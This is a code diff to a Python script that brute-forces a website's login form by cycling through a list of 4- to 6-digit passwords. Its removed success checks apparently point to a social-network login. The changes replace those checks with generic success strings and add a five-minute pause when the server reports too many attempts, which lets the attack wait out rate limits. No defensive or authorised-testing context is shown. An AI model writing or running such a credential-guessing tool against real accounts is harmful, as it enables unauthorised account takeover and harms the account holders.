@@ -1,7 +1,6 @@
 import time
 import sys
 import requests
-from bs4 import BeautifulSoup
 
 # Check Python version
 if sys.version_info[0] != 3:
@@ -41,13 +40,13 @@ session.headers.update(headers)
 # Loop through passwords
 for i, passw in enumerate(passwords, start=1):
     passw = passw.strip()
-
+    
     # Skip passwords that are not 4 to 6 digits long
     if len(passw) < 4 or len(passw) > 6:
         continue
-
+    
     print(f"{i} : {passw}")
-
+    
     try:
         # Send POST request with email and password
         payload = {
@@ -56,12 +55,15 @@ for i, passw in enumerate(passwords, start=1):
         }
         response = session.post(post_url, data=payload)
         response_data = response.text
-
-        # Check for success indicators in the response
-        if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-            print('Your password is:', passw)
-            break
-
+        
+        # Inspect the response to find success indicators
+        # You need to check the actual response from the server
+        if 'Login Successful' in response_data or 'Dashboard' in response_data:
+            print('\nSuccess! The password is:', passw)
+            break  # Break the loop once the correct password is found
+        elif 'Too many attempts' in response_data:
+            print("\nToo many login attempts detected. Sleeping for 5 minutes...")
+            time.sleep(300)
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
         print("\nSleeping for 5 minutes...\n")
